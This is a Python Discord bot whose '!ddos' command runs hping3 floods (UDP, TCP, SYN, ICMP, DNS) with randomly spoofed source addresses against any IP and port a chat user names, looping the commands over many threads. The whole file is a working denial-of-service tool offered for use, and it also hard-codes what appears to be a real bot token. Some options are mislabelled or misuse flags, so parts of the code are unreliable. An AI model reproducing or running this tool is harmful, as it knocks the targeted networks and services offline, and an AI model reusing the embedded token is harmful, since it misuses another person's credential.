import discord
from discord.ext import commands
import asyncio
import subprocess
import time
import random

TOKEN = 'MTQwOTcwODY0MTU4MTQwNDI1MA.GAawtY.nizhEQtjMc2sjW5fq0nJhBb9uwZp9Cn-fASurM'

intents = discord.Intents.default()
intents.message_content = True  
bot = commands.Bot(command_prefix='!', intents=intents)

def get_spoofed_ip():
    spoofed_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
    return spoofed_ip

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')

@bot.command()
async def ddos(ctx, attack_type, target_ip, target_port, num_threads, duration):
    print(f"Received ddos command: {attack_type} {target_ip} {target_port} {num_threads} {duration}")

    num_threads = int(num_threads)
    duration = float(duration)

    if attack_type == 'udp':
        command = f'hping3 -2 -c {duration*1000} -d 65507 -S -p {target_port} -a {get_spoofed_ip()} {target_ip}'
    elif attack_type == 'tcp':
        command = f'hping3 -S -c {duration} -d 65507 -p {target_port} -a {get_spoofed_ip()} {target_ip}'
    elif attack_type == 'http':
        command = f'hping3 -2 -c {duration} -d 65507 -p {target_port} --flood -a {get_spoofed_ip()} {target_ip}'
    elif attack_type == 'icmp':
        command = f'hping3 -1 -c {duration} -d 65507 -p {target_port} -a {get_spoofed_ip()} {target_ip}'
    elif attack_type == 'dns':
        command = f'hping3 -D -c {duration} -d 65507 -p {target_port} -a {get_spoofed_ip()} {target_ip}'
    elif attack_type == 'syn':
        command = f'hping3 -S -c {duration} -d 65507 -p {target_port} -a {get_spoofed_ip()} {target_ip}'
    else:
        await ctx.send('Invalid attack type. Use "udp", "tcp", "http", "icmp", "dns", or "syn".')
        return

    start_time = time.time()
    end_time = start_time + duration
    while time.time() < end_time:
        for _ in range(num_threads):
            await asyncio.create_task(asyncio.to_thread(subprocess.call, command.split()))

    await ctx.send(f'Starting {attack_type.upper()} attack on {target_ip}:{target_port} with {num_threads} threads for {duration} seconds.')

    ping_result = subprocess.run(['ping', '-c', '4', target_ip], capture_output=True, text=True)
    await ctx.send(f'Ping result:\n{ping_result.stdout}')

    await ctx.send(f'Attack completed. Attack type: {attack_type}, Target IP: {target_ip}, Target Port: {target_port}, Number of Threads: {num_threads}, Duration: {duration} seconds.')

bot.run(TOKEN)
